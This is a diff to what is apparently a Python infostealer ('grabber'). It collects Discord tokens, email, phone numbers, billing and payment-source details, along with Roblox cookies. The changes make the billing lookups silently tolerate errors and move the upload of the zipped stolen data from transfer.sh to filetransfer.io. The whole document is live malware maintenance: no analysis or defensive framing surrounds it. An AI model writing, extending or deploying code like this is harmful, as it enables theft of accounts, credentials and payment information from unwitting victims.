@@ -1717,15 +1717,22 @@ class first_srdl_func(Functions):
                     badges = ["None"]
                 email = j.get("email", "No Email attached")
                 phone = j.get("phone", "No Phone Number attached")
-                nitro_data = httpx.get(
-                    self.disc_url_api + "/billing/subscriptions", headers=headers
-                ).json()
-                has_nitro = bool(nitro_data)
-                payment_sources = json.loads(
-                    httpx.get(
+                try:
+                    nitro_data = httpx.get(
+                        self.disc_url_api + "/billing/subscriptions", headers=headers
+                          ).json()
+                    has_nitro = bool(nitro_data)
+                except:
+                    pass
+                time.sleep(3)
+                try:
+                    payment_sources = json.loads(
+                        httpx.get(
                         self.disc_url_api + "/billing/payment-sources", headers=headers
-                    ).text
-                )
+                        ).text
+                        )
+                except:
+                    pass
                 billing = bool(payment_sources)
                 f.write(
                     f"{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
@@ -1837,14 +1844,19 @@ class first_srdl_func(Functions):
             with open(ntpath.join(self.dir, "Roblox", "Roblox_Cookies.txt"), "w") as f:
                 f.write("\n".join(self.robloxcookies))
 
-    def upload_on_transfer(self, file_name, path):
+    def upload_on_fileio(self, file_name, path):
         try:
             with open(path, mode="rb") as file:
                 files = {"file": (file_name, file)}
-                upload = requests.post("https://transfer.sh/", files=files)
-                url = upload.text
-                self.datazip_url = url
-                return True
+                upload = requests.post("https://filetransfer.io/api/upload", files=files)
+                response = upload.json()
+                if response["status"] == "success":
+                    self.datazip_url = response["download"]
+                    print("Upload :", self.datazip_url)
+                    return True
+                else:
+                    print("error :", response["error"])
+                    return False
         except Exception as e:
             pass
             return False
@@ -2026,7 +2038,7 @@ class first_srdl_func(Functions):
             pass
 
         try:
-            self.upload_on_transfer(f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_{imthebestdev}.zip", _zipfile)
+            self.upload_on_fileio(f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_{imthebestdev}.zip", _zipfile)
             time.sleep(20)
         except:
             pass
